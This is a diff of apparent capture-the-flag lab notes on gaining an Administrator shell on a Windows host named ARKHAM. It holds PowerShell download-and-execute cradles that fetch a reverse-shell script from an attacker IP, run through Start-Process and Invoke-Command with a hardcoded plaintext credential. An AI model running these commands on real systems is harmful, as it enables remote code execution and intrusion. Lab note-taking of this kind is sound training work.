@@ -108,9 +108,12 @@ cmd%20/c%20c:\Windows\SysNative\WindowsPowershell\v1.0\powershell%20IEX(New-Obje
 #create credentials object
 $pass = ConvertTo-SecureString 'Welcome1!' -AsPlainText -Force
 $cred = New-Object System.Management.Automation.PSCredential('Administrator',$pass)
-start-Process -FilePath "powershell" -argumentlist "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.73/rev1.txt')" -credential $cred
+##### following line does not work
+#####start-Process -FilePath "powershell" -argumentlist "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.73/rev1.txt')" -credential $cred
 # run hostname
 Invoke-Command -Computer ARKHAM -Credential $cred -ScriptBlock { whoami }
+### hostname is very sensitive
+Invoke-Command -Computer re -Credential $cred -ScriptBlock { IEX(New-Object Net.WebClient).downloadString('http://10.10.14.73/rev1.txt') }
 
 #powershell suite runas 
   paste following at the bottom of the script(see bart video @ 55:36):
